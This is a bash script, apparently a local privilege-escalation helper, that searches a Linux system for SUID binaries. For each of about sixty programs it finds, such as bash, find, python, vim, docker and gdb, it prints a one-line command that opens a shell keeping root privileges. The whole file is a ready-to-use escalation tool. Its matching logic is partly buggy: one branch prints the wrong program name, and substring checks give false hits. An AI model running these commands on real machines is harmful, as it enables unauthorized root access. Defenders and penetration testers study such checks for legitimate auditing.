#!/bin/bash

red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
white='\e[1;37m'
cyan='\e[1;36m'
clear='\e[0m'

list_suid() {
    
    suidfiles=$(find / -perm -u=s -type f 2>/dev/null)
    if [[ ! -z $suidfiles ]]; then
        printf "${yellow}[!]${green} SUID files found: \n"
        for file in $suidfiles; do
            printf "${yellow}[+]${cyan} $file\n"
            sleep 0.1
        done
    else
        printf "${red}[-]${white} SUID files not found\n"
    fi
    printf "\n"
}


scan_vuln(){
    suidfiles=$(find / -perm -u=s -type f 2>/dev/null | sed -E 's/.*\/(.*)$/\1/')
    if [[ $suidfiles =~ "agetty" ]]; then
        printf "${green}[+] Found agetty ${clear}\n"
        printf  "${cyan} ╰─> agetty -o -p -l /bin/sh -a root tty ${clear}\n"
    else
        printf "${red}[-] Not found agetty command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "bash" ]]; then
        printf "${green}[+] Found bash ${clear}\n"
        printf  "${cyan} ╰─> bash -p ${clear}\n"
    else
        printf "${red}[-] Not found bash command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "busybox" ]]; then
        printf "${green}[+] Found busybox ${clear}\n"
        printf "${cyan} ╰─> busybox sh ${clear}\n"
    else
        printf "${red}[-] Not found busybox command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "capsh" ]]; then
        printf "${green}[+] Found capsh ${clear}\n"
        printf "${cyan} ╰─> capsh --gid=0 --uid=0 -- ${clear}\n"
    else
        printf "${red}[-] Not found capsh command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "chroot" ]]; then
        printf "${green}[+] Found chroot ${clear}\n"
        printf "${cyan} ╰─> chroot / /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found chroot command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "cpulimit" ]]; then
        printf "${green}[+] Found cpulimit ${clear}\n"
        printf "${cyan} ╰─> cpulimit -l 100 -f -- /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found cpulimit command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "csh" ]]; then
        printf "${green}[+] Found csh ${clear}\n"
        printf "${cyan} ╰─> csh -b ${clear}\n"
    else
        printf "${red}[-] Not found csh command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "dash" ]]; then
        printf "${green}[+] Found dash ${clear}\n"
        printf "${cyan} ╰─> dash -p ${clear}\n"
    else
        printf "${red}[-] Not found dash command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "dmsetup" ]]; then
        printf "${green}[+] Found dmsetup ${clear}\n"
        printf "${cyan} ╰─> dmsetup create base <<EOF\n"
        printf "     0 3534848 linear /dev/loop0 94208\n"
        printf "     EOF\n"
        printf "     dmsetup ls --exec '/bin/sh -p -s'${clear}\n"
    else
        printf "${red}[-] Not found dmsetup command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "docker" ]]; then
        printf "${green}[+] Found docker ${clear}\n"
        printf "${cyan} ╰─> docker run -v /:/mnt --rm -it alpine chroot /mnt sh ${clear}\n"
    else
        printf "${red}[-] Not found docker command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "emacs" ]]; then
        printf "${green}[+] Found emacs ${clear}\n"
        printf "${cyan} ╰─> emacs -Q -nw --eval '(term \"/bin/sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found emacs command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "env" ]]; then
        printf "${green}[+] Found env ${clear}\n"
        printf "${cyan} ╰─> env /bin/sh -p  ${clear}\n"
    else
        printf "${red}[-] Not found env command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "expect" ]]; then
        printf "${green}[+] Found expect ${clear}\n"
        printf "${cyan} ╰─> expect -c 'spawn /bin/sh -p; interact' ${clear}\n"
    else
        printf "${red}[-] Not found expect command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "find" ]]; then
        printf "${green}[+] Found find ${clear}\n"
        printf "${cyan} ╰─> find . -exec /bin/sh -p \; -quit ${clear}\n"
    else
        printf "${red}[-] Not found find command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "fish" ]]; then
        printf "${green}[+] Found fish ${clear}\n"
        printf "${cyan} ╰─> fish / ${clear}\n"
    else
        printf "${red}[-] Not found fish command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "flock" ]]; then
        printf "${green}[+] Found flock ${clear}\n"
        printf "${cyan} ╰─> flock -u / /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found flock command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "gcore" ]]; then
        printf "${green}[+] Found gcore ${clear}\n"
        printf "${cyan} ╰─> gcore $PID ${clear}\n"
    else
        printf "${red}[-] Not found ftpget command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "gdb" ]]; then
        printf "${green}[+] Found gdb ${clear}\n"
        printf "${cyan} ╰─> gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit ${clear}\n"
    else
        printf "${red}[-] Not found gdb command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "gimp" ]]; then
        printf "${green}[+] Found gimp ${clear}\n"
        printf "${cyan} ╰─> gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' ${clear}\n"
    else
        printf "${red}[-] Not found gimp command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "gtester" ]]; then
        printf "${green}[+] Found gtester ${clear}\n"
        printf "${cyan} ╰─> TF=$(mktemp)\n"
        printf "     echo '#!/bin/sh -p' > $TF\n"
        printf "     echo 'exec /bin/sh -p 0<&1' >> $TF\n"
        printf "     chmod +x $TF\n"
        printf "     sudo gtester -q $TF ${clear}\n"
    else
        printf "${red}[-] Not found gtester command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "hping3" ]]; then
        printf "${green}[+] Found hping3 ${clear}\n"
        printf "${cyan} ╰─> hping3\n"
        printf "     /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found hping3 command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "ionice" ]]; then
        printf "${green}[+] Found ionice ${clear}\n"
        printf "${cyan} ╰─> ionice /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found ionice command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "ispell" ]]; then
        printf "${green}[+] Found ispell ${clear}\n"
        printf "${cyan} ╰─> ispell /etc/passwd\n"
        printf "     !/bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found ispell command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "jjs" ]]; then
        printf "${green}[+] Found jjs ${clear}\n"
        printf "${cyan} ╰─> echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs ${clear}\n"
    else
        printf "${red}[-] Not found jjs command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "ld.so" ]]; then
        printf "${green}[+] Found ld.so ${clear}\n"
        printf "${cyan} ╰─> ld.so /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found ld.so command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "logsave" ]]; then
        printf "${green}[+] Found logsave ${clear}\n"
        printf "${cyan} ╰─> logsave /dev/null /bin/sh -i -p ${clear}\n"
    else
        printf "${red}[-] Not found logsave command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "make" ]]; then
        printf "${green}[+] Found make ${clear}\n"
        printf "${cyan}╰─> make -s --eval=$'x:\\\n\\\t-'\"/bin/sh -p\" ${clear}\n" 
    else
        printf "${red}[-] Not found make command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "openvpn" ]]; then
        printf "${green}[+] Found openvpn ${clear}\n"
        printf "${cyan} ╰─> openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"' ${clear}\n"
    else
        printf "${red}[-] Not found openvpn command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "nice" ]]; then
        printf "${green}[+] Found nice ${clear}\n"
        printf "${cyan} ╰─> nice /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found nice command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "node" ]]; then
        printf "${green}[+] Found node ${clear}\n"
        printf "${cyan} ╰─> node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})' ${clear}\n"
    else
        printf "${red}[-] Not found node command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "nohup" ]]; then
        printf "${green}[+] Found nohup ${clear}\n"
        printf "${cyan} ╰─> nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)" ${clear}\n"
    else
        printf "${red}[-] Not found nohup command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "perl" ]]; then
        printf "${green}[+] Found perl ${clear}\n"
        printf "${cyan} ╰─> perl -e 'exec "/bin/sh";' ${clear}\n"
    else
        printf "${red}[-] Not found perl command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "php" ]]; then
        printf "${green}[+] Found php ${clear}\n"
        printf "${cyan} ╰─> php -r \"pcntl_exec('/bin/sh', ['-p']);\" ${clear}\n"
    else
        printf "${red}[-] Not found php command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "perf" ]]; then
        printf "${green}[+] Found perf ${clear}\n"
        printf "${cyan} ╰─> perf stat /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found perf command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "python" ]]; then
        printf "${green}[+] Found python ${clear}\n"
        printf "${cyan} ╰─> python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' ${clear}\n"
    else
        printf "${red}[-] Not found python command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "rvim" ]]; then
        printf "${green}[+] Found rvim ${clear}\n"
        printf "${cyan} ╰─> rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found rvim command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "rlwrap" ]]; then
        printf "${green}[+] Found rlwrap ${clear}\n"
        printf "${cyan} ╰─> rlwrap -H /dev/null /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found rlwrap command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "run-parts" ]]; then
        printf "${green}[+] Found run-parts ${clear}\n"
        printf "${cyan} ╰─> run-parts --new-session --regex '^sh$' /bin --arg='-p' ${clear}\n"
    else
        printf "${red}[-] Not found run-parts command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "rview" ]]; then
        printf "${green}[+] Found rview ${clear}\n"
        printf "${cyan} ╰─> rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found rview command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "sash" ]]; then
        printf "${green}[+] Found sash ${clear}\n"
        printf "${cyan} ╰─> sash ${clear}\n"
    else
        printf "${red}[-] Not found sash command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "setarch" ]]; then
        printf "${green}[+] Found setarch ${clear}\n"
        printf "${cyan} ╰─> setarch $(arch) /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found setarch command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "ssh-keygen" ]]; then
        printf "${green}[+] Found ssh-keygen ${clear}\n"
        printf "${cyan} ╰─> ssh-keygen -D ./lib.so ${clear}\n"
    else
        printf "${red}[-] Not found ssh-keygen command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "strace" ]]; then
        printf "${green}[+] Found strace ${clear}\n"
        printf "${cyan} ╰─> strace -o /dev/null /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found strace command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "sshpass" ]]; then
        printf "${green}[+] Found sshpass ${clear}\n"
        printf "${cyan} ╰─> sshpass /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found sshpass command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "start-stop-daemon" ]]; then
        printf "${green}[+] Found start-stop-daemon ${clear}\n"
        printf "${cyan} ╰─> start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p ${clear}\n"
    else
        printf "${red}[-] Not found start-stop-daemon command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "stdbuf" ]]; then
        printf "${green}[+] Found stdbuf ${clear}\n"
        printf "${cyan} ╰─> stdbuf -i0 /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found stdbuf command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "timeout" ]]; then
        printf "${green}[+] Found timeout ${clear}\n"
        printf "${cyan} ╰─> timeout 7d /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found timeout command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "time" ]]; then
        printf "${green}[+] Found time ${clear}\n"
        printf "${cyan} ╰─> time /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found time command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "tclsh" ]]; then
        printf "${green}[+] Found tclsh ${clear}\n"
        printf "${cyan} ╰─> tclsh\n" 
        printf "     exec /bin/sh -p <@stdin >@stdout 2>@stderr ${clear}\n"
    else
        printf "${red}[-] Not found tclsh command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "taskset" ]]; then
        printf "${green}[+] Found taskset ${clear}\n"
        printf "${cyan} ╰─> taskset 1 /bin/sh -p ${clear}\n"
    else
        printf "${red}[-] Not found taskset command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "unshare" ]]; then
        printf "${green}[+] Found unshare ${clear}\n"
        printf "${cyan} ╰─> unshare -r /bin/sh ${clear}\n"
    else
        printf "${red}[-] Not found unshare command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "vipw" ]]; then
        printf "${green}[+] Found vipw ${clear}\n"
        printf "${cyan} ╰─> vipw ${clear}\n"
    else
        printf "${red}[-] Not found vipw command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "vimdiff" ]]; then
        printf "${green}[+] Found vimdiff ${clear}\n"
        printf "${cyan} ╰─> vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found vimdiff command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "vim" ]]; then
        printf "${green}[+] Found vim ${clear}\n"
        printf "${cyan} ╰─> vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found vim command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "watch" ]]; then
        printf "${green}[+] Found watch ${clear}\n"
        printf "${cyan} ╰─> watch -x sh -c 'reset; exec sh 1>&0 2>&0' ${clear}\n"
    else
        printf "${red}[-] Not found watch command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "vigr" ]]; then
        printf "${green}[+] Found vigr ${clear}\n"
        printf "${cyan} ╰─> vigr ${clear}\n"
    else
        printf "${red}[-] Not found vigr command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "view" ]]; then
        printf "${green}[+] Found view ${clear}\n"
        printf "${cyan} ╰─> view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' ${clear}\n"
    else
        printf "${red}[-] Not found view command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "xargs" ]]; then
        printf "${green}[+] Found xargs ${clear}\n"
        printf "${cyan} ╰─> xargs -a /dev/null sh -p ${clear}\n"
    else
        printf "${red}[-] Not found xargs command ${clear}\n"
    fi
    sleep 0.1
    if [[ $suidfiles =~ "zsh" ]]; then
        printf "${green}[+] Found zsh ${clear}\n"
        printf "${cyan} ╰─> zsh ${clear}\n"
    else
        printf "${red}[-] Not found zsh command ${clear}\n"
    fi
}



printf "${yellow}[1]${clear}${cyan}List All SUID Files${clear}\n"
printf "${yellow}[2]${clear}${cyan}Scan Possible Vulnerable SUID Commands${clear}\n"
printf "${cyan}Select an option: ${clear}"
read option

if [ $option -eq 1 ]; then
    printf "${cyan}Listing all SUID files...${clear}\n"
    list_suid
elif [ $option -eq 2 ]; then
    printf "${cyan}Scanning for possible vulnerable SUID commands...${clear}\n"
    scan_vuln
else
    printf "${red}[-] Invalid option ${clear}\n"
fi